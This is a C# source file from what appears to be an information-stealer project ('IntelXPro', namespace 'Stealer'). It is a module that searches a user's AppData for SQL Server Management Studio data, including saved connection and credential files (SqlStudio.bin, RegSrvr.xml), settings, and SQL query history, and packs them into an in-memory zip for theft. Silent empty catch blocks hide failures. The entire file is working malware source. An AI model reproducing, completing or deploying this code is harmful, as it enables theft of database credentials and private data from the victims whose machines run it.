using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class SQLServerManagementStudio : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "SQLServerManagementStudio";

            bool foundData = false;

            string[] ssmsVersions = new string[]
            {
                "Microsoft SQL Server Management Studio",
                "Microsoft\\SQL Server Management Studio",
                "Microsoft\\Microsoft SQL Server Management Studio"
            };

            foreach (string ssmsVersion in ssmsVersions)
            {
                string ssmsPath = Path.Combine(appDataPath, ssmsVersion);
                if (Directory.Exists(ssmsPath))
                {
                    foundData |= CollectFromSSMSDirectory(ssmsPath, zip, counterApplications);
                }
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromSSMSDirectory(string basePath, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] versionDirs = Directory.GetDirectories(basePath, "*", SearchOption.TopDirectoryOnly);

                foreach (string versionDir in versionDirs)
                {
                    string versionName = Path.GetFileName(versionDir);
                    
                    foundData |= CollectConnectionSettings(versionDir, versionName, zip, counterApplications);
                    foundData |= CollectUserSettings(versionDir, versionName, zip, counterApplications);
                    foundData |= CollectSQLHistory(versionDir, versionName, zip, counterApplications);
                }
            }
            catch
            {
            }

            return foundData;
        }

        private bool CollectConnectionSettings(string versionDir, string versionName, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] connectionFiles = new string[]
                {
                    "SqlStudio.bin",
                    "RegSrvr.xml",
                    "UserSettings.xml"
                };

                foreach (string connectionFile in connectionFiles)
                {
                    string fullPath = Path.Combine(versionDir, connectionFile);
                    if (File.Exists(fullPath))
                    {
                        string zipPath = $"Applications\\SQLServerManagementStudio\\{versionName}\\{connectionFile}";
                        zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                        counterApplications.Files.Add(fullPath + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }

        private bool CollectUserSettings(string versionDir, string versionName, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] settingsFiles = new string[]
                {
                    "Settings\\CurrentSettings.vssettings",
                    "Settings\\CurrentSettings-*.vssettings",
                    "ApplicationPrivateSettings.xml"
                };

                foreach (string settingsPattern in settingsFiles)
                {
                    string fullPattern = Path.Combine(versionDir, settingsPattern);
                    
                    if (settingsPattern.Contains("*"))
                    {
                        string directory = Path.GetDirectoryName(fullPattern);
                        string searchPattern = Path.GetFileName(fullPattern);
                        
                        if (Directory.Exists(directory))
                        {
                            string[] files = Directory.GetFiles(directory, searchPattern, SearchOption.TopDirectoryOnly);
                            foreach (string file in files)
                            {
                                string relativePath = file.Substring(versionDir.Length + 1);
                                string zipPath = $"Applications\\SQLServerManagementStudio\\{versionName}\\{relativePath}";
                                zip.AddFile(zipPath, File.ReadAllBytes(file));
                                counterApplications.Files.Add(file + " => " + zipPath);
                                foundData = true;
                            }
                        }
                    }
                    else
                    {
                        if (File.Exists(fullPattern))
                        {
                            string relativePath = settingsPattern;
                            string zipPath = $"Applications\\SQLServerManagementStudio\\{versionName}\\{relativePath}";
                            zip.AddFile(zipPath, File.ReadAllBytes(fullPattern));
                            counterApplications.Files.Add(fullPattern + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }

        private bool CollectSQLHistory(string versionDir, string versionName, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string sqlHistoryPath = Path.Combine(versionDir, "SQL");
                if (Directory.Exists(sqlHistoryPath))
                {
                    string[] sqlFiles = Directory.GetFiles(sqlHistoryPath, "*.sql", SearchOption.AllDirectories);
                    
                    foreach (string file in sqlFiles.Take(20))
                    {
                        string relativePath = file.Substring(versionDir.Length + 1);
                        string zipPath = $"Applications\\SQLServerManagementStudio\\{versionName}\\{relativePath}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }

                string templatesPath = Path.Combine(versionDir, "Templates");
                if (Directory.Exists(templatesPath))
                {
                    string[] templateFiles = Directory.GetFiles(templatesPath, "*.sql", SearchOption.AllDirectories);
                    
                    foreach (string file in templateFiles)
                    {
                        string relativePath = file.Substring(versionDir.Length + 1);
                        string zipPath = $"Applications\\SQLServerManagementStudio\\{versionName}\\{relativePath}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
